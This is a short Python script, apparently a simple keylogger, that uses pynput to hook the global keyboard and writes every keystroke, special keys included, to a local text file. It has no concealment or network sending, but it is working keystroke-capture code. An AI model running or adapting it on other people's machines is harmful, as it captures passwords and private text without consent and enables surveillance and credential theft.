from pynput import keyboard
import logging

file_log = r'C:\code\keylg\log.txt'

# Configure logging once at the start of the script
logging.basicConfig(
    filename=file_log, 
    level=logging.DEBUG, 
    format="%(message)s"
)

def on_press(key):
    try:
        # For standard characters, extract the character string
        if key.char is not None:
            logging.log(10, key.char)
    except AttributeError:
        # Handles special keys (Space, Enter, Shift, etc.)
        if key == keyboard.Key.space:
            logging.log(10, " ")
        elif key == keyboard.Key.enter:
            logging.log(10, "\n")
        else:
            logging.log(10, f" [{key.name}] ")

# Start the global keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
